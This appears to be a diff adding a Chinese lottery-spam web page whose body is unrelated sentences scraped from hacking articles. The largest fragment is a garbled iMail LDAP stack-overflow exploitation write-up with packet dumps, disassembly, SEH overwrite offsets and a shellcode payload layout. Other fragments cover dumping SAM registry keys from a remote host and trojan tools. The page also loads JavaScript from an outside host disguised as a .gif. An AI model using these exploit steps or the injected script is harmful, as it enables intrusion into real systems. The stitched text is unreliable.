@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>合乐彩票代理挣多少钱 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baidugo">首页</a> ><a  href="http:///baiducom">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidu">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baidugo">银航国际时时彩</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 合乐彩票代理挣多少钱</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>库管理员负责对库进行日常的管理、备份及库崩溃后的恢复问题。
+</p>
+<p>第三，我们今天讨论的关键。
+</p>
+<p>ImailiLDAP溢出分析根据iDefence的分析.出在LDImailiLDAP溢出分析根据iDefence的分析.出在LDAP协议处理不当上面.最后会导致一个基于栈的溢出.反正周末,事情也不多.自己分析分析看吧.iDefence的公告:imail是这么处理整数的.首先一个0x02标志.然后后面就是跟一个整数占用的字节数.最后才是整数自身.iDefence的举例:0x020x030x0A0x250xBD(665501(0xA25BD))这里是错误的,应该是665021.因为只知道LDAP是轻量级目录访问协议.而对协议本身一点都不熟悉.于是到python的站点下载了一个LDAP模块.抓包分析一下协议熟悉一下先.#ldapsearch.pyimportldapl=ldap.open("192.168.0.217")l.search_s("o=MyOrganisation,c=AU",ldap.SCOPE_SUBTREE,"objectclass=")使用ethereal,运行脚本.抓包如下:00000000303c020101633704176f3d4d79204f720&lt;...c7..o=MyOr0000001067616e69736174696f6e2c20633d4155ganisation,c=AU000000200a01020a010002010002010001010087................000000300b6f626a656374636c6173733000.objectclass0.EtherealLDAPSearchReuestDecode:MessageId:1MessageType:searchReuest(0x03)MessageLength:55BaseDN:o=Myorganisation,c=AUScope:Subtree(0x02)Dereference:Never(0x00)Sizelimit:0TimeLimit:0Attributesonly:FalseFilter:(objectclass=)这里是一个serachreuest.其中messageid,sizelimit,timelimit都是整数字段.对应关系是MessageID:1020101Sizelimit:0020100Timelimit:0020100自己构造一个程序测试.把MessageID字段的01改为ff,后面加大量的垃圾会使iLDAP这个进程触发异常.异常发生在下面这段代码执行的时候(测试sizelimit字段也是一样的结果)MOVDL,BYTEPTRDS:[EDX+EAX]完全和公告对应起来了.问题肯定就在这里.用idapro去反汇编idap.exe.text:00401131;Attributes:bpbasedframe.text:00401131.text:00401131vulableprocnear;CODEXREF:sub_401412+A6p.text:00401131;sub_401412+2FBp....text:00401131.text:00401131var_10=dwordptr10h.text:00401131var_C=dwordptr0Ch.text:00401131var_8=dwordptr8.text:00401131var_4=dwordptr4.text:00401131.text:00401131pushebp.text:00401132movebp,esp.text:00401134subesp,10h.text:00401137mov[ebp+var_10],ecx;[ecx+8]就是0x020xff后面的4个字节.text:0040113Amov[ebp+var_C],0.text:00401141push4;size_t.text:00401143push0;int.text:00401145leaeax,[ebp+var_4].text:00401148pusheax;void.text:00401149call_memset.text:0040114Eaddesp,0Ch.text:00401151mov[ebp+var_8],0.text:00401158jmpshortloc_401163.text:0040115A;.text:0040115A.text:0040115Aloc_40115A:;CODEXREF:vulable+5Bj.text:0040115Amovecx,[ebp+var_8].text:0040115Daddecx,1.text:00401160mov[ebp+var_8],ecx.text:00401163loc_401163:;CODEXREF:vulable+27j.text:00401163movedx,[ebp+var_10].text:00401166moveax,[ebp+var_8].text:00401169cmpeax,[edx+8].text:0040116Cjnbshortloc_40118E.text:0040116Emovecx,[ebp+var_10].text:00401171movedx,[ecx+10h];[ecx+10h]为指向0x020xFF后面的第5个字节开始的字符串的指针.text:00401174moveax,[ebp+var_10].text:00401177movecx,4;ecx=4.text:0040117Csubecx,[eax+8];[eax+8]为0x020xFF后面的4个字节.text:0040117Faddecx,[ebp+var_8];ebp+var_8在第一次循环为0.此后每次循环递增1.text:00401182moveax,[ebp+var_8].text:00401185movdl,[edx+eax];;"x02CC"后面的第5个字节开始拷贝.text:00401188movbyteptr[ebp+ecx+var_4],dl;开始逐字节写入.text:0040118Cjmpshortloc_40115A上面的注释就是在异常产生的时候的跟踪结果.可以看出程序从0x020x01后面的第5个字节开始写入0x020x01后面的4个字节经过处理后指向的地址.这样我们就可以控制程序从一个地址开始写入我们任意构造的.之前还有一些处理在exploit过程中不用太关心.触发异常的时候GlobalExceptionHandler上面指向SEH链的指针在ebp+68,如果让ebp+ecx4为ebp+68.title那么就可以用这个循环覆盖他了.40x68+4=0xFFFFFF98.title那么覆盖的buffer可以如此构造:"x02xCCxFFxFFxFFx98"+jmp06+calleax+shellcode但是发现这里shellcode被截断.根本不够放shellcode.于是考虑在BaseDN字段里面放入realshellcode.在前面说的shellcode放入一个搜索的shellcode.明天待续吧.早上起来五谷轮回的时候突然发现自己傻了.何必title那么麻烦,换一个title请求应该可以直接有地方放shellcode了.看来熬夜效率也未必高:).考虑构造另外一个协议.同样用python写一个简单的脚本.#LdapBind.pyimportldapm="A"368l=ldap.open("192.168.0.217")l.simple_bind_s("",m)00000000308201800201016082017902010204000......`..y.....0000001080820170414141414141414141414141...pAAAAAAAAAAAA0000002041414141414141414141414141414141AAAAAAAAAAAAAAAA0000003041414141414141414141414141414141AAAAAAAAAAAAAAAA........EtherealLDAPBindReuestDecode:MessageId:1MessageType:BindReuest(0x00)MessageLength:377ResponseIn:5Version:2DN:(NULL)AuthType:simple(0x00)Password:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.......这里发现还有一个问题.ethereal在解析LDAP协议的时候露掉了几个字段.就是整个包的长度.在MessageID字段之前,0x30标志之后的0x820x010x80就是表示的整个包的长度(Reuestlength).而且00000011处还有一个820170也应该是一个长度字段.刚好等于password中"AAAA..."的长度368.是不是分析协议都是要带点猜,呵呵.我测试结果是如果ReuestLength计算错误,程序不会导致异常.如果length字段比如Messagelength大于2个字节的话.title那么会用0x82作为一个标志.然后后面的两个字节来表示长度.所以用python写脚本的时候最好考虑到shellcode等占用的大小,然后构造包发送.这个时候,kk告诉我这个iMail的溢出的exploit已经有人发表在securityfocus上了,呵呵.算了,自己还是弄完吧.言归正传.构造3082018002010160820179+02ff+"AAAAAAAAAAAAA......"这次发现指向SEH链的指针地址在ebp+AC.同样的采用上面分析的方法可以得到0x020xCC后面应该是40xAC+4=ffffff54,构造好协议之后这个地址也就是固定的了.最后构造3082018002010160820179+02ff+"xffxffxffx54"+shortjmp+callebx+shellcode就行了.题外话,很多人说外面公开的那个imailldapexploit成功率很低,我一个朋友在自己机器上面测试那个exploit是成功了.LDAP是轻量级目录访问协议,很多地方都会用到,windows器开放了活动目录往往都开放此.开了389不表示一定是imail打开的.而且imail是默认不开这个的,never帮我测试exploit的时候也是扫描的389端口.发现只要不能成功溢出的都没有崩溃.389端口还能继续连接,也还没有发现崩溃但是没有成功溢出的例子(只测试了80系列和中文系统),我想我这个是不是说明这个并不是imail自带的LDAP了?而是当然.这只是个猜测,也许是exploit写的不好的原因.如果有更好的方法请指点指点小弟拉谢谢.因为觉得老外写的那个exploit没有多大问题(可能需要改改callebx地址)就不占用篇幅贴exploit了.本来是自己做的笔记,后来决定写下来看能不能到安全焦点骗点小分.嘿嘿.因为协议还有写windowsexploit我都是新手.错误在所难免.还望斧正.最后吐血感谢never的测试,还有某些人对我写下此烂文的鼓励.
+</p>
+<p>PHP所支持协议的更多信息参见附录J。
+</p>
+<p>函数和类结构声明等。
+</p>
+<p>可以发现从1986年PC机上发现大麻病毒开始至今，每隔三到四年，就会有一种全新概念的病毒出现。
+</p>
+<p>要是一个程序包被非常充分的分解了的话，title那么经连接后，得到的可执行文件会比从一个大目标文件组成的程序包连接得到的文件小得多。
+</p>
+<p>隐藏字段
+</p>
+<p>);
+</p>
+<p>写这篇文章的目的主要是对最近写的一个Linux病毒原型代码做一个总结，同时向对这方面有兴趣的朋友做一个简单的介绍。
+</p>
+<p>第三步在刺客II的主界面里选"工具箱"》"主机查找器"，就进入了"搜索因特网主机"界面。
+</p>
+<p>打开“主机资源——“搜索共享主机——填上要搜索的IP段，我们假设是查：“169.10.10.10.1169.10.10.255开始搜索……2。
+</p>
+<p>“你说BO2000好，但是绝大多数的杀毒招数都能够沟将其制服，而且我感觉他在使用上不如我手里的冰河锐利，况且我也不想黑什么器。
+</p>
+<p>RESTARTDATABASE
+</p>
+<p>作为WEB入侵。
+</p>
+<p>4、同样用at命令导出HKEY_LOCAL_MACHINEsamsamDomainsaccountusers下键值：at\13.50.97.23812:55c:winntegedit.exeehacker.regHKEY_LOCAL_MACHINESAMSAMDomainsaccountuserse是regedit.exe的参数，在_LOCAL_MACHINESAMSAMDomainsaccountusers这个键的一定要以\结尾。
+</p>
+<p>y表示确定。
+</p>
+<p>Virtualuery(pRealThunk,&amp;mbi_thunk,sizeof(MEMORY_BASIC_INFORMATION));改变修改页保护属性为PAGE_READWRITE。
+</p>
+<p>另外一个现象是Bitnet的位址。
+</p>
+<p>3月8日博客园出现首页不显示内容的问题，是由于.Text程序没有对用户显示名称进行脚本过滤造成的。
+</p>
+<p>这些预防措施包括：保持坚实的整体管理和安全程序，针对各类DoS攻击，实施特定的防卫措施等等。
+</p>
+<p>▲MySL的不足之处Access是一个关联性库管理系统，然而MySL并非在每一个层面都是如此。
+</p>
+<p>return;
+</p>
+<p>对于这次考核你需要稍稍“调低挡速，因为目录器基本结构的考核涉及到管理活动目录器而不是管理Windows2000操作系统的具体细节。
+</p>
+<p>你可以猜出它们中的大多数的名字：add，sub，mul，div等。
+</p>
+<p>1，&lt;SCRIPTLANGUAGE=&uot;javascript&uot;TYPE=&uot;TEXTjavascript&uot;
+</p>
+
+					<br/>
+					<p align=left >|下一篇：<a href="1.html">恒彩娱乐平台 网址
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
